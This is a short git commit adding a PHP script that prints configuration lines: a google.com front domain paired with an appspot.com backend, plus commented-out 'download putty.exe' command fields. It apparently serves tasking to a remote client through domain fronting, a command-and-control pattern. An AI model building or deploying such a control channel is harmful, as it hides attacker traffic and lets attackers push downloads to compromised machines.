32269d4971fd7d091437c5032788ac5febbbcfbf
haveano <cezary.wysocki+github@gmail.com>
2018-10-05 11:59:29 +0200

    Add files via upload

---
+++ domain1/helloworld.php
@@ -0,0 +1,13 @@
+<?php
+
+//echo 'Hello, World!';
+echo "front_config_d1=google.com;\n";
+echo "config_d1=domain2-196908.appspot.com;\n";
+echo "config_d1_url=;\n";
+//echo "postd1=php-post-server-195907.appspot.com";
+//echo "postd1_url=";
+//echo "command=download;\n";
+//echo "command_arg=putty.exe;\n";
+?>
+
+
